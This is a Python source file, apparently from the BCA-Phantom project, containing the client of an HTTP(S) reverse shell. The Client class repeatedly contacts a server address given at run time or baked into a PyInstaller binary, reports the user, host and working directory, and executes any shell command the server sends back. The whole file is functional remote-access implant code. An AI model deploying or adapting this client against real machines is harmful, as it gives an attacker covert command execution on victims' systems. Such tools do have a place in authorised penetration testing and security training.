#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Phantom

__author__ = "EONRaider @ keybase.io/eonraider"

import getpass
import http.client
import platform
import ssl
import sys
from pathlib import Path
from urllib.request import Request, urlopen
from urllib import parse

from src.client.commands import ClientCommands


class Client:
    def __init__(self,
                 server_address: str,
                 server_port: int, *,
                 ca_cert: [str, Path, None]):
        """Create a Reverse Shell Client that receives commands from a
        server though HTTP(S).

        :param server_address: Hostname or address of the server.
        :param server_port: Port number used by the server.
        :param ca_cert: Path to a file containing the certificate for
            the Certificate Authority (CA) in PEM format. Connects to
            HTTP servers if set to None.
        """
        self.server_address = server_address
        self.server_port = server_port
        self._commands = ClientCommands(self)
        self.ca_cert = ca_cert

    @property
    def ca_cert(self):
        """Gets the path to the CA certificate.
        Validates and sets the path to the CA certificate and
        establishes the SSL context for HTTPS connections, if any."""
        return self._ca_cert

    @ca_cert.setter
    def ca_cert(self, cert):
        if cert is None:  # Run in HTTP mode
            self._ssl_context = None
        else:             # Run in HTTPS mode
            try:
                cert = Path(cert)
            except TypeError:
                raise SystemExit(f"Invalid name for CA file: {cert}")
            if not cert.exists():
                raise FileNotFoundError(f"Non-existent file for CA certificate:"
                                        f" {cert}")
            self._ssl_context = ssl.create_default_context(
                purpose=ssl.Purpose.SERVER_AUTH,
                cafile=str(cert)
            )
        self._ca_cert = cert

    @property
    def server_url(self) -> str:
        url_scheme = "http" if self._ssl_context is None else "https"
        return f"{url_scheme}://{self.server_address}:{self.server_port}"

    @property
    def _shell_prompt(self) -> str:
        """Gets a string containing shell prompt information in the
        format user@host:/path/to/cwd$"""
        return f"{getpass.getuser()}@{platform.node()}:{str(Path.cwd())}$ "

    def post(self, request_body: dict[str, str]) -> str:
        """Send a POST request to the server.

        :param request_body: A dictionary containing key-value pairs to
            be sent as the body of the POST request.
        :return: A response to the POST request.
        """
        request_body: bytes = parse.urlencode(request_body).encode()
        url = Request(self.server_url, data=request_body)
        post_request = urlopen(url) if self._ssl_context is None else \
            urlopen(url, context=self._ssl_context)
        with post_request:
            response = post_request.read().decode()
        return response

    def execute(self) -> None:
        self._commands.open_session()
        while True:
            try:
                response: str = self.post({"prompt": self._shell_prompt})
            except (http.client.RemoteDisconnected, KeyboardInterrupt):
                break
            cmd_name, *cmd_args = response.split(" ")
            try:
                if len(cmd_name) == 0:  # cmd_name is an empty string
                    continue
                else:  # cmd_name is a method of ClientCommands
                    getattr(self._commands, cmd_name)(cmd_args)
            except AttributeError:  # cmd_name is a shell command
                self._commands.shell(response)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Phantom - HTTPS Reverse Shell Client"
    )
    parser.add_argument(
        "--host",
        type=str,
        metavar="<hostname/address>",
        help="Address or hostname of the server to connect to."
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        metavar="<port>",
        help="Port number exposed by the server."
    )
    parser.add_argument(
        "--ca-cert",
        type=str,
        metavar="<path>",
        help="Path to a file containing the certificate for the Certificate "
             "Authority (CA) in PEM format."
    )

    _args = parser.parse_args()

    if not all((_args.host, _args.port)):
        '''Client is executed as a binary compiled by PyInstaller. All 
        configuration options are read from the 'config.py' file that 
        is created and bundled in the binary during the build process 
        defined by 'build.py'. The CA certificate file, if existent, is 
        located by PyInstaller in the directory with path defined by 
        sys._MEIPASS.
        '''
        import importlib
        args = importlib.import_module("config")
        try:
            args.ca_cert = Path(sys._MEIPASS).joinpath(args.ca_cert)
        except AttributeError:
            args.ca_cert = None
    else:
        '''Client is executed from source code by the system interpreter 
        for development purposes. All configuration options are parsed 
        from the CLI.'''
        args = _args

    Client(
        server_address=args.host,
        server_port=int(args.port),
        ca_cert=args.ca_cert
    ).execute()
